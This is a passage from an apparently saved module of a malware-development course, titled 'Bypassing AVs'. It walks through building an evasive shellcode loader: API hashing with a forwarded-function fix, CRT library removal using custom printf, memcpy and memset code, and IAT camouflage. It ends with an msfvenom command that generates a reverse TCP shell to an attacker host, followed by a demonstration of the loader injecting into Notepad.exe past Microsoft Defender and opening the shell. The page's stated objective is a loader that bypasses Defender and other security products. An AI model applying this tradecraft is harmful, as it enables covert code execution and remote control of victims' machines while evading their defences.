<p>The address being retrieved using <code>GetProcAddressH</code> does not lead to a function and instead points to the string "CRYPTSP.SystemFunction032". This indicates the presence of a <em>forwarded function</em>, where a function exported from one DLL (DLL A) is located in another DLL (DLL B). When using the original <code>GetProcAddress</code>
 WinAPI to fetch the address of this kind of function, additional logic 
is performed behind the scenes to retrieve the address in DLL B. This is
 all done seamlessly and therefore one may mistakenly assume that the 
function is exported from DLL A.</p>
<p>Therefore, instead of loading <code>Advapi32.dll</code> (DLL A) to find <code>SystemFunction032</code>, <code>Cryptsp.dll</code>
 (DLL B) should be loaded as it holds the actual address. This is 
indicated by the string "CRYPTSP.SystemFunction032", which provides a 
hint as to where the function is located. This is necessary because <code>GetProcAddressH</code> does not handle forwarded functions. By making this minor change, the code will now compile and execute successfully.</p>
<p><img src="81_files/av-bypass-13.png" alt="image"></p>
<h3 id="toc-heading-25">CRT Library Removal</h3>
<p>Following the steps outlined in the <em>CRT Library Removal &amp; Malware Compiling</em> module will enable the removal of the CRT Library. An error will arise because of the usage of <code>printf</code> and <code>wprintf</code>
 functions. To solve this, a custom function can be used to replace 
these functions. The printing functionality will only be enabled when 
debug mode is enabled. The <code>printf</code> and <code>wprintf</code> functions replacement should be saved in a new file called <code>Debug.h</code>, which must be included in all files that call <code>printf</code> or <code>wprintf</code>.</p>
<p><img src="81_files/av-bypass-14.png" alt="image"></p>
<p><strong>Debug.h</strong></p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression">once</span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h&gt;</span></span>

<span class="token comment">// uncomment to enable debug mode</span>
<span class="token comment">//\
#define DEBUG</span>



<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">DEBUG</span></span>

<span class="token comment">// wprintf replacement</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">PRINTW</span><span class="token expression"><span class="token punctuation">(</span> STR<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">)</span>                                                                  </span><span class="token punctuation">\</span>
    <span class="token expression"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                                                                </span><span class="token punctuation">\</span>
        <span class="token expression">LPWSTR buf <span class="token operator">=</span> <span class="token punctuation">(</span>LPWSTR<span class="token punctuation">)</span><span class="token function">HeapAlloc</span><span class="token punctuation">(</span> <span class="token function">GetProcessHeap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> HEAP_ZERO_MEMORY<span class="token punctuation">,</span> <span class="token number">1024</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>         </span><span class="token punctuation">\</span>
        <span class="token expression"><span class="token keyword">if</span> <span class="token punctuation">(</span> buf <span class="token operator">!=</span> <span class="token constant">NULL</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>                                                                </span><span class="token punctuation">\</span>
            <span class="token expression"><span class="token keyword">int</span> len <span class="token operator">=</span> <span class="token function">wsprintfW</span><span class="token punctuation">(</span> buf<span class="token punctuation">,</span> STR<span class="token punctuation">,</span> __VA_ARGS__ <span class="token punctuation">)</span><span class="token punctuation">;</span>                                   </span><span class="token punctuation">\</span>
            <span class="token expression"><span class="token function">WriteConsoleW</span><span class="token punctuation">(</span> <span class="token function">GetStdHandle</span><span class="token punctuation">(</span> STD_OUTPUT_HANDLE <span class="token punctuation">)</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> len<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>       </span><span class="token punctuation">\</span>
            <span class="token expression"><span class="token function">HeapFree</span><span class="token punctuation">(</span> <span class="token function">GetProcessHeap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> buf <span class="token punctuation">)</span><span class="token punctuation">;</span>                                           </span><span class="token punctuation">\</span>
        <span class="token expression"><span class="token punctuation">}</span>                                                                                   </span><span class="token punctuation">\</span>
    <span class="token expression"><span class="token punctuation">}</span>  </span></span>


<span class="token comment">// printf replacement</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">PRINTA</span><span class="token expression"><span class="token punctuation">(</span> STR<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">)</span>                                                                  </span><span class="token punctuation">\</span>
    <span class="token expression"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                                                                </span><span class="token punctuation">\</span>
        <span class="token expression">LPSTR buf <span class="token operator">=</span> <span class="token punctuation">(</span>LPSTR<span class="token punctuation">)</span><span class="token function">HeapAlloc</span><span class="token punctuation">(</span> <span class="token function">GetProcessHeap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> HEAP_ZERO_MEMORY<span class="token punctuation">,</span> <span class="token number">1024</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>           </span><span class="token punctuation">\</span>
        <span class="token expression"><span class="token keyword">if</span> <span class="token punctuation">(</span> buf <span class="token operator">!=</span> <span class="token constant">NULL</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>                                                                </span><span class="token punctuation">\</span>
            <span class="token expression"><span class="token keyword">int</span> len <span class="token operator">=</span> <span class="token function">wsprintfA</span><span class="token punctuation">(</span> buf<span class="token punctuation">,</span> STR<span class="token punctuation">,</span> __VA_ARGS__ <span class="token punctuation">)</span><span class="token punctuation">;</span>                                   </span><span class="token punctuation">\</span>
            <span class="token expression"><span class="token function">WriteConsoleA</span><span class="token punctuation">(</span> <span class="token function">GetStdHandle</span><span class="token punctuation">(</span> STD_OUTPUT_HANDLE <span class="token punctuation">)</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> len<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>       </span><span class="token punctuation">\</span>
            <span class="token expression"><span class="token function">HeapFree</span><span class="token punctuation">(</span> <span class="token function">GetProcessHeap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> buf <span class="token punctuation">)</span><span class="token punctuation">;</span>                                           </span><span class="token punctuation">\</span>
        <span class="token expression"><span class="token punctuation">}</span>                                                                                   </span><span class="token punctuation">\</span>
    <span class="token expression"><span class="token punctuation">}</span>  </span></span>



<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span> <span class="token comment">// DEBUG</span></span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c"><span class="token comment">// Only print if debug mode is enabled</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">DEBUG</span></span>
	<span class="token function">PRINTA</span><span class="token punctuation">(</span><span class="token string">"..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<p>If one attempts to compile after this, they will encounter more errors because <code>memcpy</code>, <code>memset</code>, <code>toupper</code>
 are also imported from the CRT library. To fix this issue, custom 
functions that will execute the same logic must be added and stored in <code>WinApi.c</code>, which is shown below.</p>
<p><strong>WinApi.c</strong></p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">CHAR <span class="token function">_toUpper</span><span class="token punctuation">(</span>CHAR C<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>C <span class="token operator">&gt;=</span> <span class="token char">'a'</span> <span class="token operator">&amp;&amp;</span> C <span class="token operator">&lt;=</span> <span class="token char">'z'</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span> C <span class="token operator">-</span> <span class="token char">'a'</span> <span class="token operator">+</span> <span class="token char">'A'</span><span class="token punctuation">;</span>

	<span class="token keyword">return</span> C<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

PVOID <span class="token function">_memcpy</span><span class="token punctuation">(</span>PVOID Destination<span class="token punctuation">,</span> PVOID Source<span class="token punctuation">,</span> SIZE_T Size<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">volatile</span> <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> Size<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token punctuation">(</span><span class="token punctuation">(</span>BYTE<span class="token operator">*</span><span class="token punctuation">)</span>Destination<span class="token punctuation">)</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>BYTE<span class="token operator">*</span><span class="token punctuation">)</span>Source<span class="token punctuation">)</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">return</span> Destination<span class="token punctuation">;</span>
<span class="token punctuation">}</span>



<span class="token keyword">extern</span> <span class="token keyword">void</span><span class="token operator">*</span> __cdecl <span class="token function">memset</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression"><span class="token function">intrinsic</span><span class="token punctuation">(</span>memset<span class="token punctuation">)</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression"><span class="token function">function</span><span class="token punctuation">(</span>memset<span class="token punctuation">)</span></span></span>

<span class="token keyword">void</span><span class="token operator">*</span> __cdecl <span class="token function">memset</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span> Destination<span class="token punctuation">,</span> <span class="token keyword">int</span> Value<span class="token punctuation">,</span> <span class="token class-name">size_t</span> Size<span class="token punctuation">)</span> <span class="token punctuation">{</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span> p <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>Destination<span class="token punctuation">;</span>
	<span class="token keyword">while</span> <span class="token punctuation">(</span>Size <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token operator">*</span>p <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token punctuation">)</span>Value<span class="token punctuation">;</span>
		p<span class="token operator">++</span><span class="token punctuation">;</span>
		Size<span class="token operator">--</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">return</span> Destination<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<p>There is one final error to solve which is the undefined <code>_fltused</code> symbol. The <code>_fltused</code>
 symbol is a global variable in the CRT Library which is used to 
determine if floating-point operations were used in a program. By 
creating a new variable named <code>_fltused</code> and setting it to 
zero, the error will be resolved. This mirrors the initialization of the
 variable by the CRT Library, which will result in the compiler building
 the project with no errors.</p>
<h3 id="toc-heading-26">IAT Camouflage</h3>
<p>Adding the header file <code>IatCamouflage.h</code>, which contains the same code introduced in the <em>IAT Camouflage</em> module, should be done as a final step. <code>IatCamouflage.h</code> should be included in the <code>main.c</code>
 file only and called at the beginning of the main function, so that the
 import address table of the implementation will appear benign.</p>
<h3 id="toc-heading-27">Final Result</h3>
<p>This demonstration uses Msfvenom's reverse TCP shell payload which is generated via the command below.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">msfvenom <span class="token operator">-</span>p windows<span class="token operator">/</span>x64<span class="token operator">/</span>shell_reverse_tcp LHOST<span class="token operator">=</span><span class="token number">192.168</span><span class="token number">.16</span><span class="token number">.111</span> LPORT<span class="token operator">=</span><span class="token number">4444</span> <span class="token operator">-</span>f raw <span class="token operator">-</span>o reverse<span class="token punctuation">.</span>bin
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<p><code>AV.exe</code>'s IAT is shown below.</p>
<p><img src="81_files/av-bypass-15.png" alt="image"></p>
<p>Next, <code>AV.exe</code> injects into <code>Notepad.exe</code> with Microsoft Defender enabled.</p>
<p><img src="81_files/av-bypass-16.png" alt="image"></p>
<p>A successful reverse shell is established to the attacking machine and a sample command is executed.</p>
<p><img src="81_files/av-bypass-17.png" alt="image"></p>
<p>The <code>Notepad.exe</code> process has PID 20288, which matches the PID in the previous picture.</p>
<p><img src="81_files/av-bypass-18.png" alt="image"></p>

    </div>

    
       
</div></div>              </div>
              
              <div id="accessory-container" class="flex flex-col h-full lg:min-w-[500px] w-[500px]">
    <div id="objectives" class="hidden p-4 border-r border-b bg-gray-900 border-gray-600 font-code w-full h-full">
        <div class="w-full bg-gray-700 text-center mb-4 font-sans text-lg">Objectives</div>
                                                                                    <div class="flex items-center mb-2 font-sans">
                    <input type="checkbox" id="objective-0" data-objective-id="0" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                    <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Implement a loader capable of bypassing Microsoft Defender and other security solutions</label>
                </div>
                                                                                            <div class="flex items-center mb-2 font-sans">
                    <input type="checkbox" id="objective-1" data-objective-id="1" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                    <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Customize the loader to incorporate different techniques demonstrated in this course (e.g. PPID spoofing)</label>
                </div>
                                              
    </div>
    <div id="toc-container" class=" p-4 border-r border-b border-gray-600 w-full h-full">
    <div class="sticky top-0 bg-gray-800 rounded-xl">
        <div class="w-full bg-gray-700 text-center mb-4 font-sans text-lg rounded-t-xl">
        Table of Contents
        </div>

        
        

        
        <div id="toc-content" class="min-h-[70vh] max-h-[70vh] overflow-y-auto rounded-b-xl pr-2">
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:40px" data-target-id="toc-heading-0">
        <span class="text-gray-300 hover:text-white text-sm">Bypassing AVs</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-1">
        <span class="text-gray-300 hover:text-white text-sm">Introduction</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-2">
        <span class="text-gray-300 hover:text-white text-sm">Payload Loader Features</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-3">
        <span class="text-gray-300 hover:text-white text-sm">Hell's Gate Setup</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-4">
        <span class="text-gray-300 hover:text-white text-sm">Calculating Syscall Hashes</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:80px" data-target-id="toc-heading-5">
        <span class="text-gray-300 hover:text-white text-sm">Hasher Results</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-6">
        <span class="text-gray-300 hover:text-white text-sm">Payload Injection Via Hell's Gate</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:80px" data-target-id="toc-heading-7">
        <span class="text-gray-300 hover:text-white text-sm">Process Enumeration</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-8">
        <span class="text-gray-300 hover:text-white text-sm">Main Function</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-9">
        <span class="text-gray-300 hover:text-white text-sm">Loader Results</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:80px" data-target-id="toc-heading-10">
        <span class="text-gray-300 hover:text-white text-sm">Remote Code Injection</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:80px" data-target-id="toc-heading-11">
        <span class="text-gray-300 hover:text-white text-sm">Local Code Injection</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-12">
        <span class="text-gray-300 hover:text-white text-sm">Anti-Analysis Features</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:80px" data-target-id="toc-heading-13">
        <span class="text-gray-300 hover:text-white text-sm">AntiAnalysis Helper Function</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:80px" data-target-id="toc-heading-14">
        <span class="text-gray-300 hover:text-white text-sm">NtDelayExecution Via Hell's Gate</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-15">
        <span class="text-gray-300 hover:text-white text-sm">Anti-Analysis Results</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-16">
        <span class="text-gray-300 hover:text-white text-sm">Payload Encryption</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:80px" data-target-id="toc-heading-17">
        <span class="text-gray-300 hover:text-white text-sm">Brute Force Decryption</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-18">
        <span class="text-gray-300 hover:text-white text-sm">Brute Force Decryption Results</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-19">
        <span class="text-gray-300 hover:text-white text-sm">API Hashing</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:80px" data-target-id="toc-heading-20">
        <span class="text-gray-300 hover:text-white text-sm">Header File</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:80px" data-target-id="toc-heading-21">
        <span class="text-gray-300 hover:text-white text-sm">API_HASHING Structure</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:80px" data-target-id="toc-heading-22">
        <span class="text-gray-300 hover:text-white text-sm">Updating VX_Table</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-23">
        <span class="text-gray-300 hover:text-white text-sm">SystemFunction032 API Hashing Error</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:80px" data-target-id="toc-heading-24">
        <span class="text-gray-300 hover:text-white text-sm">Forwarded Functions</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-25">
        <span class="text-gray-300 hover:text-white text-sm">CRT Library Removal</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-26">
        <span class="text-gray-300 hover:text-white text-sm">IAT Camouflage</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-27">
        <span class="text-gray-300 hover:text-white text-sm">Final Result</span>
      </div></div>
    </div>
    </div>

        <script>
    // If ToC starts open, build it once the DOM is ready
    document.addEventListener('DOMContentLoaded', function () {
        var el = document.getElementById('toc-content');
        if (el && !el.innerHTML.trim() && typeof extractHeadings === 'function') {
        extractHeadings();
        }
    });
    </script>
    
    <div id="maldevDB" class="hidden p-4 border-r border-b border-gray-600 font-code w-full h-full">
        <img class="w-[500px] mb-4" src="81_files/maldev-db-logo.png">
        <form id="searchForm" class="flex flex-col items-center justify-center w-full font-mono">
            <div class="relative flex w-full border border-solid border-gray-700 rounded-3xl">
            <i class="absolute fa fa-search text-gray-400 top-[14px] left-4 z-20"></i>
            <input placeholder="Search Maldev Database" type="search" name="q" autocomplete="off" id="searchInput" maxlength="85" class="relative m-0 -mr-0.5 h-[46px] w-full rounded-l-3xl  bg-transparent px-10 py-[0.25rem] font-normal leading-[1.6] text-white outline-none focus:bg-gray-800 focus:border-r focus:border-gray-700" aria-label="Search">
                <button class=" w-[70px] bg-gray-800 flex items-center justify-center rounded-r-3xl px-6 py-2.5 text-white hover:bg-gray-700" type="submit">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" class="h-5 w-5" style="--darkreader-inline-fill: currentColor;" data-darkreader-inline-fill="">
                    <path fill-rule="evenodd" d="M9 3.5a5.5 5.5 0 100 11 5.5 5.5 0 000-11zM2 9a7 7 0 1112.452 4.391l3.328 3.329a.75.75 0 11-1.06 1.06l-3.329-3.328A7 7 0 012 9z" clip-rule="evenodd"></path>
                    </svg>
                </button>
            </div>
            <div class="relative inline-block text-sm w-full md:w-fit">
                <select id="languageSelect" name="language" class="border rounded-md p-2.5 bg-gray-800 border-gray-600 placeholder-gray-400 text-white outline-none appearance-none w-full pr-8 my-4">
                    <option value="all" selected="selected">All languages</option>
                    <option value="c">C</option>
                    <option value="cpp">C++</option>
                    <option value="python">Python</option>
                    <option value="nim">Nim</option>
                    <option value="rust">Rust</option>
                    
                </select>
                <div class="absolute inset-y-0 right-0 flex items-center px-2 pointer-events-none">
                    <svg class="h-4 w-4 text-gray-700" fill="#fff" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" style="--darkreader-inline-fill: var(--darkreader-text-ffffff, #e8e6e3);" data-darkreader-inline-fill="">
                        <path d="M5.516 7.548c.436-.446 1.045-.481 1.576 0L10 10.405l2.908-2.857c.531-.481 1.141-.446 1.576 0 .436.445.408 1.197 0 1.643l-3.564 3.642c-.214.223-.502.335-.92.335s-.707-.112-.92-.335l-3.564-3.642c-.408-.446-.436-1.198 0-1.643z"></path>
                    </svg>
                </div>
            </div>
        </form>
        <div class="resultsWrapper">
            <div id="noResults" class="flex flex-col justify-center items-center hidden">
                <div class="text-white text-sm opacity-50 w-full text-center font-mono mt-4">
                    No results found.
                </div>
            </div>
            <div id="rateLimited" class="flex flex-col justify-center items-center hidden">
                <div class="text-white text-sm opacity-50 w-full text-center font-mono mt-4">
                    HTTP 429 - You have been rate limited.
                </div>
            </div>

            <!-- Results here -->

            <div class="flex justify-center mt-6">
                <button id="loadMore" class="hidden bg-blue-700 text-white px-4 py-2 rounded hover:bg-blue-600 font-mono text-sm">
                    Load More
                </button>
            </div>
        </div>
    </div>
</div>
<div id="progress-container" class="hidden flex-col lg:min-w-[500px]">
    <div id="progress" class="p-4 border-r overflow-auto border-b border-gray-600 font-code w-full min-h-full">
    <div class="max-h-[300px]">
                <div class="w-full bg-gray-700 text-center mb-4 font-sans text-lg">Modules Progress</div>
                                    <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-1" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./1.html">
                    <div for="module-1" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 1 - Welcome Module
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-2" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./2.html">
                    <div for="module-2" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 2 - Introduction To Malware Development
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-3" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./3.html">
                    <div for="module-3" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 3 - Required Tools
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-4" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./4.html">
                    <div for="module-4" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 4 - Coding Basics
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-5" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./5.html">
                    <div for="module-5" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 5 - Windows Architecture
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-6" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./6.html">
                    <div for="module-6" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 6 - Windows Memory Management
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-7" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./7.html">
                    <div for="module-7" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 7 - Introduction To The Windows API
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-8" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./8.html">
                    <div for="module-8" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 8 - Portable Executable Format
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-9" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./9.html">
                    <div for="module-9" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 9 - Dynamic-Link Library
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-10" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./10.html">
                    <div for="module-10" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 10 - Detection Mechanisms
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-11" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./11.html">
                    <div for="module-11" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 11 - Windows Processes
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-12" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./12.html">
                    <div for="module-12" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 12 - Undocumented Structures
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-13" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./13.html">
                    <div for="module-13" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 13 - Payload Placement - .data &amp; .rdata Sections
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
